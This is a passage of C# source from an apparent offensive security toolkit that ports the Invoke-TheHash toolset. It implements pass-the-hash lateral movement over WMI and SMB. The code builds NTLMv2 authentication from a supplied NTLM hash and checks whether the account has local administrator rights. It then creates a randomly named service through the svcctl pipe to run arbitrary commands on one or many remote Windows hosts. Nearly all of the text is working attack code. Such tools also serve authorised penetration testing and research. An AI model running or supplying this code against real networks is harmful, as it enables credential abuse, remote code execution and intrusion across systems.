                                                                request_split_index_tracker += request_split_index;
                                                                request_split_stage++;
                                                                sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                sequence_number_counter++;
                                                                request_flags = new byte[] { 0x80 };
                                                                WMI_client_stage_next = "Request";
                                                            }
                                                        }


                                                    }

                                                }
                                                break;
                                        }
                                        packet_RPC = WMIExec.RPCRequest(request_flags, stub_data.Length, 16, request_auth_padding, request_call_ID, request_context_ID, request_opnum, request_UUID);

                                        if (request_split)
                                        {
                                            packet_RPC["RPCRequest_AllocHint"] = BitConverter.GetBytes(request_length);
                                        }

                                        packet_NTLMSSP_verifier = WMIExec.NTLMSSPVerifier(request_auth_padding, new byte[] { 0x04 }, sequence_number);
                                        NTLMSSP_verifier = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                                        RPC_Sign = sequence_number.Concat(Utilities.ConvertFromPacketOrderedDictionary(packet_RPC))
                                            .Concat(stub_data)
                                            .Concat(Utilities.GetByteRange(NTLMSSP_verifier, 0, request_auth_padding + 7)).ToArray();

                                        RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                                        RPC_signature = Utilities.GetByteRange(RPC_signature, 0, 7);
                                        packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                                        NTLMSSP_verifier = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);

                                        WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC).Concat(stub_data).Concat(NTLMSSP_verifier).ToArray();
                                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                                        WMI_client_random_port_stream.Flush();

                                        if (!request_split)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                        }

                                        while (WMI_client_random_port_stream.DataAvailable)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            Thread.Sleep(10);
                                        }
                                        WMI_client_stage = WMI_client_stage_next;
                                    }
                                    break;
                                case "Result":
                                    {
                                        while (WMI_client_random_port_stream.DataAvailable)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            Thread.Sleep(10);
                                        }

                                        if (WMI_client_receive[1145] != 9)
                                        {
                                            target_process_id = Utilities.DataLength(1141, WMI_client_receive);
                                            success = true;
                                        }

                                        WMI_client_stage = "exit";
                                    }
                                    break;
                            }
                            Thread.Sleep(10);
                        }
                        WMI_client_random_port.Close();
                        WMI_client_random_port_stream.Close();
                    }
                }
                WMI_client.Close();
                WMI_client_stream.Close();
            }
            if (success)
            {
                output.AppendLine(String.Format("Command executed with process ID {0} on {1}", target_process_id, target_long));
            }
            else
            {
                output.AppendLine("Process did not start, check your command");
            }
            return output.ToString();
        }


        /// <summary>
        /// Determines if a username and hash has administrative privilege on a target
        /// </summary>
        /// <param name="username">The Username to query.</param>
        /// <param name="hash">The NTLM hash for the user</param>
        /// <param name="domain">The logon domain for the user</param>
        /// <param name="target">The target to query.</param>
        /// <returns>True for Admin, False for not.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static bool SMBAdminCheck(string username, string hash, string domain, string target)
        {
            string result = SMBExecute(username, hash, domain, target, AdminCheck: true);
            if (result.Contains(" is a local administrator on "))
                return true;
            else
                return false;
        }


        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="targets">The target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecute(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var target in targets)
            {
                sb.AppendLine(SMBExecute(username, hash, domain, target, command, sleep, ServiceName, AdminCheck, ComSpec, ForceSMB1, debug));
            }

            return sb.ToString();
        }
        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="target">The target computer to run the command on.</param>
        /// <param name="command">The Command to execute on the target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecute(string username, string hash, string domain, string target, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            bool debugging = true;

            //Trackers
            bool login_successful = false;
            bool service_deleted = false;
            bool SMBExec_failed = false;
            bool SMB_execute = false;
            bool SMB_signing = false;
            string output_username;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-", "");
            string[] processID2 = processID.Split('-');
            StringBuilder output = new StringBuilder();
            string stage_current = "";
            string stage = "";
            int SMB2_message_ID = 0;
            int SMB_close_service_handle_stage = 0;
            int SMB_split_stage = 0;
            int SMB_split_index_tracker = 0;
            double SMB_split_stage_final = 0;
            //Communication
            byte[] SMBClientReceive = null;
            //Packet Reqs
            byte[] process_ID_Bytes = Utilities.ConvertStringToByteArray(processID.ToString());
            byte[] SMB_session_ID = null;
            byte[] session_key = null;
            byte[] SMB_session_key_length = null;
            byte[] SMB_negotiate_flags = null;
            byte[] SMB2_tree_ID = null;
            byte[] SMB_client_send = null;
            byte[] SMB_FID = new byte[2];
            byte[] SMB_service_manager_context_handle = null;
            byte[] SCM_data = null;
            byte[] SMB_service_context_handle = null;
            byte[] SMB_named_pipe_bytes = null;
            byte[] SMB_file_ID = null;
            byte[] SMB_user_ID = null;
            OrderedDictionary packet_SMB_header = null;
            OrderedDictionary packet_SMB2_header = null;

            if (String.IsNullOrEmpty(username) || String.IsNullOrEmpty(hash) || String.IsNullOrEmpty(target))
            {
                output.AppendLine("Missing Required Params");
            }
            else
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            if (!string.IsNullOrEmpty(domain))
                output_username = domain + '\\' + username;
            else
                output_username = username;


            if (!AdminCheck)
            {
                if (debug) { output.AppendLine("AdminCheck is false"); }
                if (!string.IsNullOrEmpty(command))
                {
                    if (debug) { output.AppendLine("String is not empty"); }
                    SMB_execute = true;
                }
            }

            TcpClient SMBClient = new TcpClient();
            SMBClient.Client.ReceiveTimeout = 60000;

            try
            {
                SMBClient.Connect(target, 445);
            }
            catch (Exception e)
            {
                output.AppendLine("Could not connect to target");
            }

            if (SMBClient.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to {0}", target)); }
                NetworkStream SMBClientStream = SMBClient.GetStream();
                SMBClientReceive = new byte[1024];
                string SMBClientStage = "NegotiateSMB";

                while (SMBClientStage != "exit")
                {
                    if (debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
                    switch (SMBClientStage)
                    {
                        case "NegotiateSMB":
                            {
                                packet_SMB_header = new OrderedDictionary();
                                packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });
                                OrderedDictionary packet_SMB_data = SMBExec.SMBNegotiateProtocolRequest(ForceSMB1);
                                byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    ForceSMB1 = true;
                                    //SMB_version = "SMB1";
                                    if (debug) { output.AppendLine("Using SMB1"); }
                                    SMBClientStage = "NTLMSSPNegotiate";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_signing = true;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_signing = false;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                    }
                                }
                                else
                                {
                                    if (debug) { output.AppendLine("Using SMB2"); }
                                    SMBClientStage = "NegotiateSMB2";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_signing = true;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_signing = false;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };
                                    }
                                }
                            }
                            break;
                        case "NegotiateSMB2":
                            {
                                SMB2_message_ID = 1;
                                packet_SMB2_header = new OrderedDictionary();
                                SMB2_tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                SMB_session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x00, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                OrderedDictionary packet_SMB2_data = SMBExec.SMB2NegotiateProtocolRequest();
                                byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                SMBClientStage = "NTLMSSPNegotiate";

                            }
                            break;
                        case "NTLMSSPNegotiate":
                            {
                                SMB_client_send = null;
                                if (ForceSMB1)
                                {
                                    packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                    if (SMB_signing)
                                    {
                                        packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                    }
                                    OrderedDictionary packet_NTLMSSP_negotiate = SMBExec.NTLMSSPNegotiate(SMB_negotiate_flags, null);
                                    byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                    byte[] NTLMSSP_negotiate = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                    OrderedDictionary packet_SMB_data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                                    byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                    OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                    byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                }
                                else
                                {
                                    packet_SMB2_header = new OrderedDictionary();
                                    SMB2_message_ID += 1;
                                    packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                    OrderedDictionary packet_NTLMSSP_negotiate = SMBExec.NTLMSSPNegotiate(SMB_negotiate_flags, null); //need to see if packet_version works? Maybe this is just left over?
                                    byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                    byte[] NTLMSSP_negotiate = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                    OrderedDictionary packet_SMB2_data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_negotiate);
                                    byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                    OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                    byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                }
                                SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                SMBClientStage = "exit";
                            }
                            break;

                    }
                }
                if (debug) { output.AppendLine(String.Format("Authenticating to {0}", target)); }
                string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                int SMB_NTLMSSP_bytes_index = SMB_NTLMSSP_Index / 2;
                int SMB_domain_length = Utilities.DataLength(SMB_NTLMSSP_bytes_index + 12, SMBClientReceive);
                int SMB_target_length = Utilities.DataLength(SMB_NTLMSSP_bytes_index + 40, SMBClientReceive);
                SMB_session_ID = Utilities.GetByteRange(SMBClientReceive, 44, 51);
                byte[] SMB_NTLM_challenge = Utilities.GetByteRange(SMBClientReceive, SMB_NTLMSSP_bytes_index + 24, SMB_NTLMSSP_bytes_index + 31);
                byte[] SMB_target_details = null;
                SMB_target_details = Utilities.GetByteRange(SMBClientReceive, (SMB_NTLMSSP_bytes_index + 56 + SMB_domain_length), (SMB_NTLMSSP_bytes_index + 55 + SMB_domain_length + SMB_target_length));
                byte[] SMB_target_time_bytes = Utilities.GetByteRange(SMB_target_details, SMB_target_details.Length - 12, SMB_target_details.Length - 5);
                string hash2 = "";
                for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                string[] hash_string_array = hash2.Split('-');
                string auth_hostname = Environment.MachineName;
                byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                HMACMD5 HMAC_MD5 = new HMACMD5();
                HMAC_MD5.Key = NTLM_hash_bytes;
                string username_and_target = username.ToUpper();
                byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                byte[] username_and_target_bytes = username_bytes.Concat(auth_domain_bytes).ToArray();
                byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                Random r = new Random();
                byte[] client_challenge_bytes = new byte[8];
                r.NextBytes(client_challenge_bytes);



                byte[] security_blob_bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_target_time_bytes)
                    .Concat(client_challenge_bytes)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_target_details)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                byte[] server_challenge_and_security_blob_bytes = server_challenge_and_security_blob_bytes = SMB_NTLM_challenge.Concat(security_blob_bytes).ToArray();
                HMAC_MD5.Key = NTLMv2_hash;
                byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                if (SMB_signing)
                {
                    byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                    session_key = session_base_key;
                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                    HMAC_SHA256.Key = session_key;
                }
                NTLMv2_response = NTLMv2_response.Concat(security_blob_bytes).ToArray();
                byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                byte[] SMB_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);

                byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(auth_LM_offset)
                        .Concat(NTLMv2_response_length)
                        .Concat(NTLMv2_response_length)
                        .Concat(auth_NTLM_offset)
                        .Concat(auth_domain_length)
                        .Concat(auth_domain_length)
                        .Concat(auth_domain_offset)
                        .Concat(auth_username_length)
                        .Concat(auth_username_length)
                        .Concat(auth_username_offset)
                        .Concat(auth_hostname_length)
                        .Concat(auth_hostname_length)
                        .Concat(auth_hostname_offset)
                        .Concat(SMB_session_key_length)
                        .Concat(SMB_session_key_length)
                        .Concat(SMB_session_key_offset)
                        .Concat(SMB_negotiate_flags)
                        .Concat(auth_domain_bytes)
                        .Concat(auth_username_bytes)
                        .Concat(auth_hostname_bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_response).ToArray();
                if (ForceSMB1)
                {
                    packet_SMB_header = new OrderedDictionary();
                    SMB_user_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                    packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });

                    if (SMB_signing)
                    {
                        packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                    }

                    packet_SMB_header["SMBHeader_UserID"] = SMB_user_ID;
                    OrderedDictionary packet_NTLMSSP_negotiate = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                    byte[] NTLMSSP_negotiate = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                    OrderedDictionary packet_SMB_data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                    byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                    OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                    byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                    SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                }
                else
                {
                    SMB2_message_ID += 1;
                    packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                    OrderedDictionary packet_NTLMSSP_auth = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                    byte[] NTLMSSP_auth = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_auth);
                    OrderedDictionary packet_SMB2_data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_auth);
                    byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                    OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                    byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                    SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                }



                SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);

                if (ForceSMB1)
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        login_successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to authenticate to target.");
                        return output.ToString();
                    }
                }
                else
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        login_successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to Authenticate to target.");
                        return output.ToString();
                    }
                }

                if (debug) { output.AppendLine(String.Format("Login Status: {0}", login_successful)); }
                if (login_successful)
                {
                    byte[] SMBExec_command;
                    byte[] SMB_path_bytes;
                    string SMB_Path = "\\\\" + target + "\\IPC$";
                    if (ForceSMB1)
                    {
                        SMB_path_bytes = Encoding.UTF8.GetBytes(SMB_Path).Concat(new byte[] { 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_path_bytes = Encoding.Unicode.GetBytes(SMB_Path);
                    }

                    byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
                    byte[] SMB_service_bytes;
                    string SMB_service = null;
                    if (string.IsNullOrEmpty(ServiceName))
                    {
                        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                        var rand = new Random();
                        SMB_service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                        SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_service = ServiceName;
                        SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
                        if (Convert.ToBoolean(SMB_service.Length % 2))
                        {
                            SMB_service_bytes = SMB_service_bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                        }
                        else
                        {
                            SMB_service_bytes = SMB_service_bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                        }
                    }
                    if (debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_service)); }
                    byte[] SMB_service_length = BitConverter.GetBytes(SMB_service.Length + 1);

                    if (ComSpec)
                    {
                        if (debug) { output.AppendLine("Appending %COMSPEC% /C"); }

                        command = "%COMSPEC% /C \"" + command + "\"";
                    }

                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    List<byte> SMBExec_command_list = new List<byte>();
                    foreach (byte commandByte in commandBytes)
                    {
                        SMBExec_command_list.Add(commandByte);
                        SMBExec_command_list.Add(0x00);

                    }
                    byte[] SMBExec_command_init = SMBExec_command_list.ToArray();

                    if (Convert.ToBoolean(command.Length % 2))
                    {
                        SMBExec_command = SMBExec_command_init.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMBExec_command = SMBExec_command_init.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    byte[] SMBExec_command_length_bytes = BitConverter.GetBytes(SMBExec_command.Length / 2);
                    int SMB_split_index = 4256;
                    int SMB_signing_counter = 0;
                    byte[] SMB_tree_ID = new byte[2];
                    string SMB_client_stage_next = "";
                    if (ForceSMB1)
                    {
                        SMBClientStage = "TreeConnectAndXRequest";
                        while (SMBClientStage != "exit" && SMBExec_failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnectAndXRequest":
                                    {
                                        packet_SMB_header = new OrderedDictionary();
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter = 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBTreeConnectAndXRequest(SMB_path_bytes);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_Session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_Session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            byte[] SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }

                                        SMB_client_send = NetBIOS_Session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "CreateAndXRequest";
                                    }
                                    break;
                                case "CreateAndXRequest":
                                    {
                                        SMB_named_pipe_bytes = new byte[] { 0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00 }; //svcctl
                                        SMB_tree_ID = Utilities.GetByteRange(SMBClientReceive, 28, 29);
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
